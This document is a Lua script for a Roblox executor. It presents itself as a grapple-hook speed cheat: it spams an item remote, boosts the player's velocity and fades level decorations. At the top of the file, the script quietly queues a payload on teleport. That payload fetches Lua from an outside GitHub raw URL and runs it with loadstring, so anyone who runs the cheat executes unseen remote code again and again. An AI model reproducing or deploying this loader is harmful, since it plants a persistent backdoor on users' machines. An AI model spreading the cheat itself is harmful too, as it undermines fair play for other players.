local ADMIN_RAW_URL = "https://raw.githubusercontent.com/temujones1239012i3/11234123123/refs/heads/main/1.lua"
if shared._AutoReloadQueued then return end
shared._AutoReloadQueued = true
local function find_queue()
    if type(queue_on_teleport) == "function" then return queue_on_teleport end
    if syn and type(syn.queue_on_teleport) == "function" then return syn.queue_on_teleport end
    if secure_load and type(secure_load.queue_on_teleport) == "function" then return secure_load.queue_on_teleport end
    if KRNL and type(KRNL.queue_on_teleport) == "function" then return KRNL.queue_on_teleport end
    for k,v in pairs(_G) do
        if type(v) == "function" and tostring(k):lower():find("queue_on_teleport") then
            return v
        end
    end
    return nil
end
local queue_func = find_queue()
if queue_func and ADMIN_RAW_URL and ADMIN_RAW_URL ~= "" then
    local queued_payload = [[
        local url = "]] .. ADMIN_RAW_URL .. [["
        local function safeGet(u)
            if syn and type(syn.request) == "function" then
                local ok,res = pcall(function() return syn.request({Url=u,Method="GET"}).Body end)
                if ok and res then return res end
            end
            if type(http_request)=="function" then
                local ok,res = pcall(function() return http_request({Url=u}).Body end)
                if ok and res then return res end
            end
            if type(request)=="function" then
                local ok,res = pcall(function() return request({Url=u}).Body end)
                if ok and res then return res end
            end
            if type(game.HttpGet)=="function" then
                local ok,res = pcall(function() return game:HttpGet(u) end)
                if ok and res then return res end
            end
            local HttpService = game:GetService("HttpService")
            local ok,res = pcall(function() return HttpService:GetAsync(u) end)
            if ok and res then return res end
            return nil
        end
        local code = safeGet(url)
        if code then
            local fn = loadstring(code)
            if fn then pcall(fn) end
        end
    ]]
    pcall(function() queue_func(queued_payload) end)
end

local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")
local FIRE_INTERVAL = 0.1
local SPEED_MULTIPLIER = 5
local GRAPPLE_TOOL_NAME = "Grapple Hook"
local Event = ReplicatedStorage.Packages.Net:WaitForChild("RE/UseItem")
local movementConnection, fireConnection
local isHoldingGrapple = false

local function checkForGrappleHook()
    if character then
        local tool = character:FindFirstChild(GRAPPLE_TOOL_NAME)
        return tool and tool:IsA("Tool")
    end
    return false
end

local function applyDirectVelocity()
    if character and character:FindFirstChild("HumanoidRootPart") and isHoldingGrapple then
        local rootPart = character.HumanoidRootPart
        local moveVector = humanoid.MoveDirection
        if moveVector.Magnitude > 0 then
            local currentVelocity = rootPart.AssemblyLinearVelocity
            rootPart.AssemblyLinearVelocity = Vector3.new(
                moveVector.X * humanoid.WalkSpeed * SPEED_MULTIPLIER,
                currentVelocity.Y,
                moveVector.Z * humanoid.WalkSpeed * SPEED_MULTIPLIER
            )
        end
    end
end

local function fireGrappleHook()
    if isHoldingGrapple then
        pcall(function()
            Event:FireServer(0.70743885040283)
        end)
    end
end

local function startFireLoop()
    if fireConnection then fireConnection:Disconnect() end
    fireConnection = spawn(function()
        while character and character.Parent do
            fireGrappleHook()
            wait(FIRE_INTERVAL)
        end
    end)
end

local function startMovementLoop()
    if movementConnection then movementConnection:Disconnect() end
    movementConnection = RunService.Heartbeat:Connect(function()
        isHoldingGrapple = checkForGrappleHook()
        applyDirectVelocity()
    end)
end

local function initialize()
    startFireLoop()
    startMovementLoop()
end

local function onCharacterAdded(newChar)
    character = newChar
    humanoid = character:WaitForChild("Humanoid")
    isHoldingGrapple = false
    if movementConnection then movementConnection:Disconnect() movementConnection = nil end
    if fireConnection then fireConnection:Disconnect() fireConnection = nil end
    task.wait(1)
    initialize()
end

player.CharacterAdded:Connect(onCharacterAdded)
if character and character.Parent then initialize() end
Players.PlayerRemoving:Connect(function(plr)
    if plr == player then
        if movementConnection then movementConnection:Disconnect() end
        if fireConnection then fireConnection:Disconnect() end
    end
end)

local function applyDecorationsTransparency(parent)
    for _, obj in ipairs(parent:GetDescendants()) do
        if obj:IsA("Folder") and obj.Name == "Decorations" then
            for _, part in ipairs(obj:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.Transparency = 0.4
                end
            end
        end
    end
end

applyDecorationsTransparency(workspace)

